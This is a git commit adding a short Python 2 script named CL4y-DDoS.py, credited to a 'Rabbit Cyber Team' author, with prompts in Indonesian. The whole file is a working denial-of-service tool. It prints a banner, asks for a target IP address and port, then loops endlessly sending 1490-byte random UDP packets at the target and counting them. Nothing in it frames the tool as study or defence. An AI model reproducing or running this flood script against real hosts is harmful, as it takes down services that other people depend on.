0dc47a93e2bfb7f6d9ce4101df76966256a5a95c
RabbitCL4Y <44805762+RabbitCL4Y@users.noreply.github.com>
2019-01-10 09:22:07 +0800

    Create CL4y-DDoS.py

---
+++ CL4y-DDoS.py
@@ -0,0 +1,42 @@
+import sys
+import os
+import time
+import socket
+import random
+#Perlengkapan Tempur :v
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDoS Attack RCT")
+print
+print "Creator   : MR.CL4Y"
+print "Thanks To : Anon6372098"
+print "You Tube  : https://www.youtube.com/channel/UC6z-i5NX934RvX7BWr3MlJw (D4RK SYST3M F41LUR3 S33K3R)"
+print "Github    : https://github.com/RabbitCL4Y"
+print "Email     : Mhmmdrafli456@gmail.com"
+print "Team.     : Rabbit Cyber Team (RCT)"
+print
+ip = raw_input("Masukkan IP Target : ")
+port = input("Masukkan Port      : ")
+
+os.system("clear")
+os.system("figlet Dimulai")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip, port))
+     sent = sent + 1
+     port = port + 0
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 0
